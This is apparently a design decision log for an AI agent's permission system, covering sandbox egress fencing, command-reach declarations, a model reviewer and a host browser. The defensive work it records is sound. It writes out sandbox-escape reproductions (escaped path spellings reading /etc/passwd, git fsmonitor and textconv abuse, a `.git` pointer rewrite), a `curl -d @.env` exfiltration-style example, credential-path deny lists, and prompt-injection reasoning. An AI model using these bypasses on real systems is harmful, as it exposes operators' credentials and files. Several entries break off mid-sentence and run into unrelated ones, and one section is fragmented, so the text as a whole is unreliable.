  - **A bare cross-reference resolves inside the referring tool's own category**, which is the only place it is unambiguous — `list`, `select` and `start` are ordinary words in browser and calendar prose and registered tool names elsewhere, so a global map rewrites a tab action into `project_list`. Outside backticks only a name carrying an underscore is rewritten at all; rewriting a bare "read" in a sentence is worse than leaving it.

- **D72 — Where a permission level is explained 🟢 DECIDED: once, in the brief, at Plan and Manual only — and never inside a tool description.** Descriptions across the catalog told the model what approval would do: "Reversible, so it isn't gated", "needs no approval", "shown to them for approval first". Every one of those is a claim about the **level** (D59), written into text that ships identically at all four of them. At Plan the tool is not offered at all; at Auto the sentence describes a park that will not happen. The model was reading a promise the chassis then broke, on every turn, on every tool that made one.
  - **So tool text became level-agnostic**, and what replaced the promise is the part that is always true: what the tool does, and that its explanation argument is what the operator reads when deciding. `prompts/levels.py` sits beside `prompts/modes.py` and `PermissionSpec.instructions` mirrors `ModeSpec.instructions`, so a level's prose lives with the rest of that row's declaration and the engine registers it exactly like the mode's.
  - **Only two levels say anything, and the asymmetry is the point.** At Plan the base instruction to act rather than propose is the wrong posture, and a model that does not know why its tools are missing reads a deliberately narrowed catalog as a broken installation and reports it as one. At Manual every change stops on the operator, so the model's own batching decides how many times they are interrupted — nothing else in the brief tells it that, because at every other level it is not true. Edit and Auto are the levels the base prompt was written for.
  - **A fragment at every level, for symmetry, is the rejected angle.** These are head-of-prompt bytes on every request, and restating a rule the paragraph above already states does not reinforce it — it dilutes the one place it is stated and pays for the privilege.
  - **Varying a description by level was the other**, and it re-crosses the line the describing stage was built not to cross: it makes a tool's text a function of the thread, so the operator's catalog and the model's copy stop being the same string and the stage that normalises text becomes policy-aware.
  - **None of this buys enforcement**, and it is worth saying so plainly: Plan is enforced by absence, Manual and Edit by a park, Auto by a review, all of it whether or not the model has read a word about it. What a fragment buys is an explanation for what the model is about to run into.

- **D73 — The untrusted-content preamble 🟢 DECIDED: one sentence, at every ingestion point.** D11 met `XC-SEC-5` with sentinel-delimited blocks plus a standing "treat this as data" instruction, and the instruction had grown into a paragraph explaining the threat model. It is emitted **once per block** — every search batch, every fetched page, every mail body, every corpus hit — so a turn reading five sources paid for it five times, and the sentences past the first were an argument rather than a rule. A model skims an argument.

A marker with nothing beside it saying what it means is a marker.

- **D75 — Which clock the operator is on 🟢 DECIDED: the host's, read once, in one module.** Three surfaces answered the question three ways: the standing brief's date line gave a date and no zone, `builtin_now` returned UTC, and the calendar's default timezone was the literal string `UTC`. - **D78 — The sandbox as a blast radius 🟢 DECIDED: disposable workspaces, gated exits, one fence tuned for exfiltration.** D23 built a cage and D41 built a worktree, and the two disagreed about what containment was for. The cage said *nothing may happen*: a read-only root, `--network none`, egress reachable only through a one-shot `network=True` container. The worktree said *anything may happen, in a place that does not matter*: a real host shell with no OS fence outside the checkout at all. The first made ordinary work — `pip install`, a build cache, a scratch file outside `/work` — feel like an attack on the system; the second made a stolen SSH key one `curl` away. Neither was measuring the thing worth measuring. The model that replaces both is one sentence: **the walls are not the boundary, the exits are.** A workspace is a blast radius — everything inside it is disposable, and what is guarded is what crosses out.
  - **Every agent workspace is disposable, and a child's is a fork of its parent's.** Real files enter as copies (the sandbox's bind-mounted `/work`) or on a throwaway branch (the coding worktree). Nothing the agent does inside either can reach the operator's own tree except through a merge they press. A delegated `worker` therefore does not need to be trusted with its parent's files — it gets its own copy or its own child branch (`core/fork.py`, `services/sandbox/fork.py`, `WorktreeManager.fork`/`merge_back`), works there, and hands back a merge report where a path both sides moved is a **conflict**, never an overwrite. A forked workspace is never sealed: it is a copy of files already archived under the parent's key, and a second at-rest copy under a key nobody will ask for again is storage, not safety.
  - **Four exits, and only those are gated.** Writing the operator's real files (merge/export), changing the host (`code_run_host_command`), messages and money, and reaching a domain the allowlist does not name (`code_request_egress`). Compute, installing packages, and reaching a package registry are what the workspace is *for* and cost nothing — the walls came down deliberately: no `--read-only` root (it bought nothing `--user` does not already buy, since the image's tree is root-owned and the box is not root, while turning every world-writable scratch path into an error the agent could not act on), a 1g `/tmp` tmpfs, and honest caps (4g / 2.0 cpus / 1024 pids) instead of caps tight enough to look strict and loose enough to break a real build.
  - **One fence, two implementations, one list.** Container-backed execution (normal and research threads) runs on a **per-session `--internal` network with an allowlisting proxy sidecar as its only exit** (`services/sandbox/sidecar.py` + `egress_proxy.py`); the code-mode shell and the approved host command run under **seatbelt/bubblewrap confinement** (`services/sandbox/host.py`) that denies credential paths and the data directory, allows writes in the worktree, and permits the same domains. Both read one setting, `egress_allowed_domains` (`services/egress.py`) — two lists would mean a hole in whichever one nobody remembered to widen. The proxy replaces the per-call `network=True` bridge container outright: a flag that swapped the fence for a different container each time it was set is not a policy anyone can read, and a name-based allowlist is the only form of egress control an operator can actually answer (an IP set is stale the moment a CDN moves).
    - **One list means one *meaning* too, and the narrower reading wins.** A plain entry is that host and nothing else; `*.example.com` is the subdomain form. The container's proxy could read a plain entry either way, `sandbox_runtime` matches it exactly, and a single list read wider at one fence than the other is the drift the single setting exists to prevent — so both are exact, and the seed names each host it needs (`files.pythonhosted.org` beside `pypi.org`). It is also what the approval card says: `github.io` granted as "every page anyone can publish" would be an approval that did not state what it gave.
    - **The host fence bounds where a command reaches off the machine, not everything it can reach.** `allow_local_binding` is on, because a dev server and its test suite are compute and refusing them would make the fenced shell useless for the work it exists for — and the runtime's rule is `localhost:*`, all of it or none. So a fenced command can also talk to whatever else listens on the operator's loopback, including the ports this application publishes for its own managed containers (the web-fetch browser's DevTools port is unauthenticated and fetches on request). Stated rather than closed: port-granular local rules are not something the runtime offers, and the containers that publish those ports are the ones the operator's own features need.
  - **`code_request_egress` is approved per call, never as a standing grant.** The domain is remembered for the workspace once approved — retrying the code that failed must not ask twice — but the *act of widening* is never granted for a conversation, because "let it reach anything it asks for from here on" is exactly the grant an injected instruction would want. It is withheld from a delegated run, which has nobody to ask, and from **code mode**, which has no container: a grant widens a workspace's own proxy, while the host confinement filters against the installation-wide allowlist alone. Offered there it would spend an approval on nothing; withheld, the model names the host it could not reach and the operator moves `egress_allowed_domains`.
  - **The code-mode shell's fence is REQUIRED; the host hatch keeps degrading.** They differ in what was consented to. The operator approved *this specific* host command and read it, so a missing platform primitive degrades to running it unconfined and saying so — refusing would break the one case the tool exists for. Nobody consented to an unfenced agent shell running a long stretch of commands nobody reads one by one, so that refuses legibly when confinement cannot initialise. This is the bullet of D41 that is gone: coding mode is no longer the mode with no OS-level fence.
  - **The spare pool is removed and boot reconciliation replaces it.** The adversarial review measured it: a hardened `docker run -d` is ≈100 ms against a model round trip, so a pre-warmed spare bought roughly nothing — while the real cold cost, reinstalling `.venv`/`node_modules` after a seal, is exactly what a *neutral* spare cannot carry. It also leaked: containers up 45 hours and two dozen orphaned `_spare-*` directories survived unclean restarts, because nothing reconciled at boot. So containers are minted lazily, per conversation, and `services/sandbox/reconcile.py` clears the `odysseus-(sbx|pre|egress)-*` containers, `odysseus-net-*` networks and leftover pool dirs a dead process left behind — boot being the one moment everything carrying our names is provably not in use. The plaintext workspaces the same crash stranded are *not* collected there (sealing needs a vault still locked at boot); the idle sweep adopts them at the first unlock (`SandboxSessionManager._seal_orphans`).
  - **The isolation unit was the conversation, and the fork is what fixed it.** The same review found sub-agents running on the parent's `deps` — the parent's container, its exec lock, its pid and memory caps — which is the reason delegation grew a fork rather than a bigger pool. Pooling only earns its keep if the runtime moves off Docker (Apple's `container` microVMs, say); re-measure then, not before.
  - **Supersedes, precisely.** **D23:** the *Degradation* bullet's "network egress from the sandbox is off/controlled by default", and in *As built* the read-only root, `--network none` for session work, and the `network=True` one-shot bridge container — all replaced by the internal network plus sidecar. D23's invariant (copies only, the operator's real files never mounted, no host env, fail-closed detection, host execution as a separately approval-gated tool) **stands unchanged**. **D41:** the *"What this gives up, stated plainly"* bullet — the shell is now fenced, and the stated fallback of bind-mounting the worktree into the container is no longer the answer; and *"one worktree per project"* is qualified, since a delegated worker takes a child worktree on its own branch beside its parent's. Everything else in D41 (the branch, the merge gate, `git init` never implicit, the workspace resolver, mode as a tool filter) **stands**. **D42:** *"rebound per conversation, and the reason is rooting rather than isolation"* holds for the read-only `explorer` and is superseded for the `worker`, where isolation is now precisely the reason — a writer cannot share its parent's deps, and `tools/worker.py` runs it first-party because the harness's `SubAgents` forwards those deps verbatim and re-raises `ApprovalRequired` out of the child.

- **D79 — What lets a command run unasked 🟢 DECIDED: its structure, a declared reach and an OS fence — never a list of programs.** D60's deterministic stage was a read-only program table plus per-program flag and subcommand rows, and an adversarial pass over the Auto level broke it four ways on this machine at once. The walk reasoned over the *unexpanded token text*, so `cat .\./etc/passwd`, `cat \/etc/passwd`, `cat {..,}/etc/passwd` and `cat .[.]/.[.]/etc/passwd` were each read as an ordinary in-workspace path and each read `/etc/passwd` under the `/bin/sh` the harness actually spawns. And the two most-run rows on the table were the least defensible: `git status` and `git diff` execute whatever the *repository* names through `core.fsmonitor`, `diff.external` and a `.gitattributes` `textconv` — so the table's central claim, "this program only observes", was a claim about a program the repository had already replaced.
  - **A table answers "what will this binary do", which is a question about software nobody in this repository maintains.** Every row is a promise someone re-derives from a man page, on a version they are not pinning; the rows that mattered could not be written at all. So the stage now establishes three things it can actually see: what the command's **syntax names** (paths, redirects, environment values, and every construct that could not be read — a word carrying `\ { } [ ] * ?` or a backtick is now `unbounded` rather than taken literally, which is the fix for all four of the reproductions above), the **reach the model declared** (D80), and whether this host can **hold a process to that reach**. Bounded + contained + declared + fenced clears; anything else escalates, with the reason naming which of the three was missing.
  - **The fence is what made the table unnecessary, and it is also what the table could never have been.** `sandbox_runtime` (seatbelt on macOS, bubblewrap on Linux) confines a *spawned process*, so it answers `git status`, `git diff`, `make`, `npm run` and a test suite with plugins in one rule instead of enumerating none of them. Writes are deny-by-default with an allowlist — the worktree, the temp root, the four paths a commit on this thread's branch has to touch, and the operator's own additions — and the repository's own metadata is protected **by path** (`config`, `hooks`, `packed-refs`, `info`, `refs/tags`, `refs/remotes`), because `git config`, a shell redirect and a Python script are the same write and only a path-shaped rule catches all three.
  - **The additions are the build caches, and they are a *second* list rather than a reuse of the host hatch's, because the two are approved differently.** `Settings.worktree_command_allow_write` seeds `~/.cache`, `~/Library/Caches`, `~/.npm/_cacache`, `~/.bun/install/cache`, `~/.cargo/registry`, `~/.cargo/git` and `~/go/pkg/mod` — seven paths in the operator's home that a command nobody was asked about may write. They are there because without them the ordinary work this tier exists to clear does not run at all (`uv` cannot initialise `~/.cache/uv`, `npm ci` cannot write `~/.npm/_cacache`), and every one of them holds content the tool would re-download rather than something the operator wrote. **Reusing `host_command_allow_write` is the rejected angle**: it is as broad as `~`, which is defensible for a command the operator read and approved and is the fence dissolved for one they never saw. Deliberately excluded for the same reason are the sibling paths that *name a program to run* — `~/.cargo/config.toml`, `~/.gradle/init.gradle`, `~/.npmrc` — since a fence a command can write its way out of is not one.
  - **The fence's own inputs are denied too, which is the subtler half of "what runs cannot exceed what was declared".** The git paths above are found by following two pointers a *linked worktree* keeps inside what this same profile makes writable: `<root>/.git` (a file naming the private directory) and the `commondir` inside it. Rewriting one escapes nothing on the spot — it changes what the **next** command's profile is built from, so two commands that each stay inside the worktree and clear structurally (`printf … > tpl`, `cp tpl .git`) hand a third an allow on any directory on the host. Reproduced end to end before it was closed. Both files are now write-denied, and `GitDirs.read` believes a pointer only when the two halves agree about which repository they describe (git writes a worktree's metadata at `<common>/worktrees/<name>`) — forging *that* shape for a directory we may not already write means first creating a directory inside it, which is the write being attempted. A plain checkout has no pointer to hold: `.git` is the metadata directory there, a denial is a subpath in both runtimes, and denying it would deny the commit with it.
  - **Reads are the half no fence holds, and saying so is load-bearing.** The runtime has a read *denylist* and no read allowlist, so a fenced command can read anything outside the denied credential paths. That is why containment is checked before everything else, why a word the grammar cannot place as a single path is refused rather than measured optimistically, and why the shell adopts the directory a command ended in **only while it is still under the worktree root** (`shell_runner.FencedShell._apply_captured_cwd`) — a session whose tracked directory left the root would have every later relative path judged against a place the command is no longer in.
  - **Escalation tables are the first rejected angle**: keep the program list and add rows for the dangerous flags and subcommands. It is the same unmaintainable claim one level deeper, it grows a row per upstream release, and the case that started this — `git -c core.fsmonitor=…`, a `.gitattributes` in a cloned repository — is not a flag any table can name, because the program is chosen by data the operator's own checkout carries.
  - **A parser-only answer is the second**: harden the AST walk and trust it alone. A parser can only say what the command's *text* names, and a program does what it does once it is running — `pytest` loads plugins, `npm run` runs the package's own scripts, a Makefile names anything. The walk is necessary (it is the whole answer for reads) and is nowhere near sufficient for writes and egress.
  - **Where the fence cannot initialise, nothing is cleared deterministically.** Missing `ripgrep`, no `sandbox-exec`, no `bwrap` — the stage escalates with that as the reason and the model reviewer rules with the structural facts in front of it. This deliberately inverts the host hatch, which runs *unconfined* when the primitive is missing (D59): there the operator read and approved that exact command, and here nobody was asked at all.
  - **The environment pins stayed, narrowed to what they can honestly say** (`services/sandbox/gitenv.py`): `core.fsmonitor=false` and `core.pager=cat` are handed to git through `GIT_CONFIG_KEY_n`, which beats every config file. `diff.external` and the per-driver `textconv`/`clean`/`smudge` keys are *not* there and cannot be — git reads them as command lines, so the empty string is a program named `""` and pinning it breaks every `git diff` on the machine. Those are the fence's to bound, which is precisely why the git diff family reaches the reviewer on a host with no fence.
  - **The tool builds the fence itself, out of the declaration rather than out of a verdict, at every level.** `tools/shell.py` re-extracts the same structural facts over the call it is about to execute and wraps the command in the profile the declared reach names — nothing rides on the park, the approval payload or the resume, so an Edit-level *operator* approval of a `reach="workspace"` command is fenced identically, having passed no gate at all. **Exactly two declarations run as written, and each is somebody's explicit yes**: a `host` declaration, which asks for the unfenced machine and is what the approver was shown, and a declaration the command's own syntax **contradicts** — a `workspace` command naming `/etc/passwd` or a URL — which was approved in the words it was read in, so holding it to a reach it plainly does not have would break the act rather than bound it. A `network` declaration is not one of them: it reaches the reviewer (D80) and then runs fenced to the allowed-domains list, the empty list included. The third unwrapped path is not a decision at all — a host with no fence available has no profile to build, which is the same missing primitive that stops the deterministic stage clearing anything there.
    - **Keying the wrap off the deterministic stage's answer is the rejected angle**, and it reads as the natural one: the stage already ruled, so wrap what it cleared. It is wrong because that stage declines `ls $(true)` and `git commit -m 'fix the parser'` for being **unreadable**, not for reaching anywhere — so running what it declined unwrapped would let any command escape the fence by being written so nothing could read it, and the model reviewer that then allowed the command was never asked about the fence. Which stage approved a call and what boundary it runs inside are different questions, and only the second one is this file's.

- **D80 — Who says how far a command reaches 🟢 DECIDED: the model declares it, the tool enforces it, and a reach into the network is always the reviewer's.** A fence has to be built *before* the command runs, and nothing in the command's text says whether `uv sync` is expected to hit an index or read a lockfile. The party that knows is the one writing the command, so the two executing shell tools take a third argument — `reach: "workspace" | "network" | "host"` — described to the model in terms of the sandbox it builds and never in terms of the permission level, which is one string shipping at all four of them (D72). Structure then checks the declaration rather than trusting it: a `workspace` command naming a network address, or naming a path outside the worktree, escalates as a *contradiction*, and a command that needs more than it declared fails inside the fence with a note (`fence.annotate`) telling it to redeclare rather than to work around a broken tool.
  - **Trying it offline and escalating on the failure is the rejected angle.** It reads as strictly better — no declaration to get wrong — and it is worse in three ways: a half-run command leaves partial state (a truncated download, a half-written lockfile) that the retry now has to reason about, the common case pays two executions, and a denied egress is indistinguishable from a broken command, so the model's next move is a workaround rather than a redeclaration.
  - **A deterministic `network` tier is the reversal, and it was the plan until the fence's read gap was followed all the way through.** The design had a fourth cleared tier: a `network` command whose paths are contained, fenced to the operator's allowed-domains list. But the fence cannot bound **reads** — so a command cleared at `workspace` can already read whatever the operator's account can, and the *only* way any of it leaves the machine is a command that reaches out. An allowed-domains list narrows where a command may go and says nothing about what it may send; every host in the seed accepts an upload as readily as it serves a download, and `git push` of copied data is inside it. So the judge escalates every command *declared* `network` with "reaches the network; the reviewer decides", whatever the list holds; the list stays what the **fence holds an approved one to**, and an empty list still means no network at all.
    - **The enforceable sentence is "reviewed *or* denied", and it is worth writing out because the shorter one is false.** The judge reads a declaration and a syntax tree, not a program's behaviour: `git push origin thread`, `npm publish`, `scp f host:/p` and `rsync -a . host:/p` name no address, so declared `workspace` they clear structurally like any other contained command. What happens next is the fence — a `workspace` profile carries an **empty** allowed-domains list, and the runtime then emits no outbound allow at all, so the command fails at the boundary and the model is told to redeclare. So an egress attempt is either put in front of a reviewer (it was declared, or the command names an address and the declaration is contradicted) or refused by the OS; what it is never is quietly performed. A register sentence saying every networked command reaches a reviewer would have a reader expecting to *see* the attempt, when the honest half of the guarantee is that the attempt does not land.
  - **Dropping `github.com` from the seed is the other rejected angle** — the one host whose presence most obviously enables that push. It is rejected because it buys a feeling rather than a boundary: `pypi.org` and `registry.npmjs.org` accept uploads too, so removing one host leaves the route open while breaking the ordinary work of a code thread (cloning, fetching, reading a raw file). The seed is what a build needs; who may egress at all is the review's question, and that is where it is answered.
  - **The read denylist widened instead, because it is the part that *is* enforceable** (`Settings.host_command_deny_read`): beside `~/.ssh`, `~/.aws`, `~/.gnupg` and `~/.config/gh` it now names `~/.netrc`, `~/.docker`, `~/.kube`, `~/.config/gcloud`, `~/.azure`, `~/Library/Keychains` and the two shell histories — standing credentials, plus the place the credentials nobody meant to store end up. The same list is denied for *writing*, since read denial alone would still let a command clobber a key it could not read, and a per-call profile replaces the global one rather than narrowing it, so `fence.py` restates it deliberately.
  - **A `reach="host"` declaration is never cleared here**, whatever it names: it is the operator's own machine, unfenced, and the whole design's claim is that what runs cannot exceed what was declared. It escalates as a declaration rather than as a missing fence, so the reason an operator reads is the most specific true one.

The change is only about who is left holding the decision, and the answer a human gives is not the same kind of object as the one a rubric gives.
  - **Refusal also teaches the wrong lesson.** A model told "no" on `git rebase` does not stop; it reaches for the next spelling of the same act, which is how a clean refusal becomes a worse command. A park ends the attempt with a person in it.
  - **`review_refusal` went with it** rather than being left unreachable, since nothing produces a refusal any more; `_WIRE_DECISION` keeps `"block"` so a thread reviewed before the change still replays its stored event, and the frontend still renders the word.

- **D82 — What a standing "allow for this conversation" actually allows 🟢 DECIDED: at Auto it feeds the review; on a command-running tool it names the command.** A grant was a **tool-name** row checked *before* the review ran, so one tick under a shell approval — the checkbox that reads "don't ask again" — turned the Auto level off for `shell_run_command` for the rest of the thread. Every command after it ran unjudged and unreviewed, which is a strictly larger permission than the operator was offered, granted by the surface that describes itself as the smallest one.
  - **So at Auto the grant stops settling and starts *informing*.** `_by_level` leaves a REVIEW policy alone and the grant rides into `review(..., granted=True)` as the operator's authorization — filling the `neutral` gap only, never overturning an `explicitly_no` the reviewer just read out of this turn, and never making a `too_destructive` act run. It carries no exception to the park either: a grant is an *input* to a review, so where no review could run (no utility model bound, a timeout) there is nothing for it to authorize. Where the grant is what changed the answer the approval is marked as the grant's, because a grant is revocable while the rest of the batch is still parked and the resume path re-checks it.
  - **And a grant on a tool that runs a command is scoped to the command's leading words**, derived server-side from the parked call and never sent by the client — one tick under a test run is a standing yes to `uv run pytest` and to nothing else. Three rules make the scope name the *act*: the words are matched **whole rather than as a prefix** (a yes to a bare `env` would otherwise stand for everything under it), **flags count as words** (an option says what the act is — `curl -sS <url>` collapsed to `curl` would have stood for `curl -d @.env <elsewhere>`), and only the three **operands** are capped. A command whose scope cannot be read, or one whose paths leave the worktree, records no grant at all, and the approve response says so. A command declaring a reach wider than its tool's own records the reach *into* the scope, as a leading `@host` / `@network` word: at Auto those are the only shell calls that ever park, so a scoping that refused them would have left "allow for this conversation" with nothing it could apply to — and a grant recorded under `host` covers `host` runs of the same words and nothing narrower or wider. A quoted multi-word argument ends the scope before it (`git commit -m 'fixed the parser'` is `git commit -m`), since a message is the target of the act and a scope names the act.
  - **The column is `NOT NULL DEFAULT ''`, and that is not a style choice**: SQLite treats NULLs as distinct in a UNIQUE index, so a nullable `command_prefix` would break the upsert's `on_conflict` match and quietly write a second grant every time. The empty string is the whole-tool grant, which is still what a non-command tool gets — and what a scheduled task's `pre_authorized` seed writes, since there the operator named a tool ahead of any turn and there is no command to name.
  - **Amended by D99.** Both halves above describe what a *single* tick records, and they still do — but they were the only thing on offer, and from use that turned out to be too narrow to say what an operator sometimes means. A second, separately-worded width now sits beside it: a deliberate standing yes to the whole tool, which at Auto is read as the answer rather than as an input. What D82 established is unchanged as the default and as the narrow width's behaviour.
  - **Per-project standing rules are the rejected angle** — a checked-in file of allowed command patterns, the shape several agent CLIs ship. It is a second permission system with its own vocabulary, written far from the moment the decision is being made, and it silently outlives the work it was written for: nothing ever prompts a re-read, so the rules that accumulate are exactly the ones nobody remembers granting. A conversation grant is bounded by a thread the operator can see, is listed as a chip beside the composer, and dies with the thread.

- **D83 — Where a fresh thread starts 🟢 DECIDED: Auto, for new threads only.** `DEFAULT_PERMISSION` was `edit` — every thread began by asking about each shell command until the operator raised it, which made the level that exists to stop asking the one nobody was in. It moves now and not earlier for a reason that is the previous four entries: Auto reaches no further than Edit (the two share a ceiling, `workspace_write`), and it differs only in *who answers at that boundary*. - **D84 — The agent's browser is a window on the host 🟢 DECIDED: launch a visible Chromium and share it with the operator.** D57 gave the operator a screencast of the agent's browser and nothing going back up the wire, on the reasoning that letting them click would put two drivers on one page. What that ruled out is the thing they actually want: doing a step themselves because it is faster than describing it, and setting up a starting point — log in, land on the right page — before handing the thread over. So the browser becomes a real window: Playwright launches Chromium `headless=False` on the host, the operator uses it the way they use any browser, and the agent drives the same instance over CDP.
  - **Routing pointer and key events onto the JPEG feed is the rejected angle.** It is the shape that preserves D57's architecture — the page stays in the container, the frames keep coming down, and a new channel carries clicks and keystrokes up — and it rebuilds a remote desktop badly: coordinate mapping against a scaled frame, IME and clipboard and file pickers that never work, native scrolling that stutters at whatever the ack loop sustains. The operator rejected it as over-complicated for a machine that already has a window server. A literal window is not a worse remote control; it is the absence of one.
  - **The container stays, and it now belongs to `web_fetch` alone.** D27's isolation argument is untouched for the thing it was made about: an unattended fetch renders an arbitrary URL the model chose, and that page's JavaScript must not run beside the backend. The agent's browser is the other case — the operator is in front of it, it is where they are logged in — and pretending otherwise cost the one property it needed. One browser each, no fallback between them: an agent browse that cannot get a window fails as itself rather than silently landing somewhere the operator cannot see.
  - **Nothing launches until something asks.** `ensure()` runs on the first acquire, under a lock, so a boot opens no window and an installation whose threads never browse never sees Chromium. It is also what makes the failure honest — the proxy and the browser come up together on the path that needs them, and a launch that fails logs once and degrades, rather than a startup task that failed hours earlier being discovered as a missing capability.
  - **The SSRF boundary is a proxy on the host now, and it costs the loopback.** The same `proxy_script.py` the container used runs as a loopback subprocess and Chromium launches behind `--proxy-server`; no proxy, no browser, because a window with an unfiltered egress path is the one outcome worth refusing outright. The in-process `EgressPolicy` stays unenforced for D57's reason (routing turns on CDP's Fetch domain and bot walls read it), so the proxy is the single enforcement point, out of process where a page cannot reason around it. The visible cost is that **the operator's own dev servers are refused in that window** — `http://127.0.0.1:3000` is a private address and the proxy does not know the difference between the operator typing it and a page reaching for it. That is the trade: their ordinary browser is one command-tab away, and a guard with a "but not when the operator meant it" clause is not a guard.
  - **A conversation's logins survive its session, in storage state.** The window is reaped on idleness like any other session, and without persistence the reap would throw away the login the operator set up by hand five minutes earlier — which turns the whole feature into something you cannot leave alone. So teardown writes Playwright storage state (cookies and localStorage for every site that conversation visited) to `<data_dir>/browser/<conversation>.json` and the next attach restores it. It is operator data on the operator's disk, the same class as the sandbox workspace, and it is worth naming as such: a file that holds session cookies, keyed by thread — which is why **deleting the conversation deletes it**, beside the workspace, the plan and the View history. A thread the operator destroyed must not leave the sites it signed into signed in.
  - **Reaping counts activity, not tool calls, and a closed window means done.** An idle timer measuring only the agent's calls would reap a session the operator is actively using, which is the most annoying way this could fail. The sweep therefore reads recorded events and the URL of every tab — and a change since the last sweep is a use, whoever caused it. And a window with no tabs left is released outright: closing the last one is the operator saying they are finished with it, a clearer signal than any timeout. Both questions are asked of the *browser context* rather than of the harness's page list, which holds only the tabs it opened itself: a tab the operator opened is in neither list, and judging the window by that list would call one they are working in empty — then close it under them, since tearing the session down drops the CDP client the context belongs to.
  - **Two drivers on one page is accepted, unarbitrated.** A tool call can land mid-click. Locking the page against the operator would make the window read-only again by another name, and locking the agent out while they work needs a notion of "working" that does not exist. The agent is also **not told what the operator did** — no synthesized activity note, no "the operator navigated to…" — because that is a stream of turn-by-turn interruptions describing changes it can read for itself; it re-reads with `snapshot`/`get_text`, which is what it does after its own actions anyway.
  - **The screencast and everything carrying it are deleted rather than kept as a second view.** The screencast loop, the stream socket and its close codes, the frontend panel, and the `browser.live` event all existed to answer "what is the browser doing", and the window answers it natively and better. Keeping them would mean maintaining a lower-fidelity mirror of a thing already on screen, and the panel would go on claiming the viewport slot D57 gave it. `GET /browser/session/{id}` survives — it says whether a conversation has a live window — and gains a `POST` so the operator can open one from the thread's actions menu before the agent has touched it.
  - **The accepted cost is that page JavaScript now runs on the host.** D27 and D57 both turned on not running it there, and for the agent's browser that is reversed: what stands between an arbitrary page and the operator's filesystem is Chromium's own sandbox, which is what stands between them and every other page they open all day — so the launch asks for it **explicitly**, because Playwright's own default is off and a mitigation this argument rests on must not be inherited from a library default that disables it. The proxy still refuses private addresses, so the network reach is narrower than their ordinary browser's; the process isolation is a real step down from a container, and it is the price of the window being usable.

- **D85 — One fenced shell, not two 🟢 DECIDED: the runner owns the process, the tool owns the declaration, and the profile is what passes between them.** Two branches answered the same question at once and neither answer composed with the other. D78 replaced the harness `Shell` with a first-party `FencedShell` because the harness spawns processes itself and left nowhere to rewrite a command, then fenced every command with a profile built once per workspace. D80 kept the harness and added the per-command `reach`, building a profile per call — and paid for the missing spawn seam twice over: `_validate_as_written` reached into `ShellToolset._check_command` so the harness's own checks would see the command *before* it was wrapped, and the working-directory capture, landing outside the fence, needed a `case`-guarded `cd` generated into a shell string to carry a `cd` back in. The runner never hears the word *reach* and the tool never builds a sandbox config, so the permissions vocabulary and the sandbox vocabulary each stay on one side of one function argument. A fence detail leaking up, or a permissions concept leaking down, is how this becomes two mechanisms again.

  - **What the fence is required for, and what it degrades for, stayed split as both branches had it.** A host that cannot confine a process refuses the shell tools outright (nobody consented to an unfenced agent shell), so by the time a profile is built there is always a fence — which is what lets "cleared or not, the command is fenced" have no exceptions in it. - **D93 — Owning a lifted harness toolset's events 🟢 DECIDED: one empty capability owns them all, and the whole catalog is stamped.** Pydantic AI 2.43 refuses a `CapabilityEvent` it cannot attribute to a registered capability. Six `pydantic_ai_harness` capabilities — `planning`, `filesystem`, `subagents`, `compaction`, `system_reminders`, `spend` — emit such events from inside their tool functions, and this codebase registers those **toolsets** directly rather than the capabilities that own them (D69's catalog promise: the operator's settings list and the agent's real stack cannot diverge). So the upgrade turned a deliberate registration choice into a mid-turn `UserError` on the first task-list mutation or file write — seven tests, and every real turn that touched either.

The other half is not negotiable: a capability contributes its *own* toolset, un-namespaced and outside the enabled gate, so `write_plan` would arrive beside `tasks_write` and a tool switched off in settings would not be the tool withheld from the agent. That is the divergence the namespacing exists to prevent, and it is pinned by a literal-set test.
  - **A per-category owner was rejected for rot, not effort.** Two of the six are wired today; the other four are one feature away. A list of "categories that need an owner" does not fail at assembly when it falls behind — it fails mid-turn, in whichever category was added, on the first mutation. So the stamp goes on the **whole** catalog in the describing stage, and the owner is one capability rather than six: the id is an attribution handle, not a claim about behaviour.
  - **Stamping every tool is safe because of what the field gates.** `capability_id` decides a tool's availability in exactly two places, and both additionally require the owning capability to declare `defer_loading`. This owner never does, so a stamp cannot hide a tool or make it unsearchable — which is what makes the broad application defensible rather than merely convenient.
  - **The owner is deliberately empty** — no tools, no instructions, no hooks — so it cannot reintroduce by the back door either thing that made the capability form the rejected shape.
  - **The last gap was the prefix, and it is the library's asymmetry rather than ours.** The owner is looked up from `tool_manager.tools[ctx.tool_name]`, keyed by the namespaced name (`tasks_write`), but a `PrefixedToolset` rewrites `ctx.tool_name` to the *unprefixed* one (`write`) before delegating inward — so the lookup misses for every prefixed toolset, which is all of ours. A wrapper that delegates to a harness toolset restates the catalog's name on the way in; nothing else on those paths reads `tool_name`.

- **D94 — The reviewer prompt's order, and its nonce, are cache decisions 🟢 DECIDED: batch-invariant content first, one fence token per batch.** A turn's deferred calls are reviewed together over one transcript at Auto level, and the reviewer prompt was arranged the other way round: the per-call structural facts first, the shared conversation last. That is the head/tail seam rule measured rather than reasoned: where in the prefix a byte moves is the whole cost. The implied prefill rate, ~620 tokens/s, is what `prefill_tokens_per_second` reports.
    - **A displaced prefix is still held.** Returning to the original prefix after the changed one cost 1.22s rather than another 9.48s, so this build retains more than one cached prefix — which makes the background-call-evicts-the-chat cause materially softer here than the single-slot worst case.
    - **The `timings` → `provider_details` item is declined, on evidence.** There is no cached-token figure anywhere on the OpenAI route: `usage` carries `prompt_tokens`/`completion_tokens` and no `prompt_tokens_details`, `stats` is `{}`, and the streamed final chunk carries `usage` and nothing else. Overriding `_process_provider_details` would have been dead code against the operator's actual server, and the streamed-path question it was gated on never arises.

Measured on the same server with `qwen3.8-27b` (MLX, 5,936 tokens): an identical replay took **0.37s** against 13.63s cold, a request whose *last* paragraph differed took **3.20s**, and one whose *first* sentence differed took **9.09s** — the last two equally novel and the same length, which rules out a response cache and leaves prefix reuse as the only explanation. Returning to an earlier prefix cost 0.37s, so it retains more than one. **So the head/tail rule pays on both runtimes**, and what the backend field actually distinguishes is whose knobs exist: the `/props` flags are a real `llama-server` command line, and behind an embedded runtime the only lever is binding `utility` elsewhere.
    - **Tool-array *order* is part of the cacheable prefix, confirmed there rather than on GGUF.** On the llama.cpp model a ~1.2s floor swamped a 596-token difference and the reading was inconclusive; on MLX adding four tools cost 10.13s, reordering the same four cost 10.19s, and returning to the original order cost **0.39s** — the arrangement was still cached. That is what `agent/prefix_watch.py` hashing the array *in order* rests on. It also means a dormant-group reveal costs this model's template the whole prefix rather than a tail, which raises the value of a reveal being a once-per-group event.
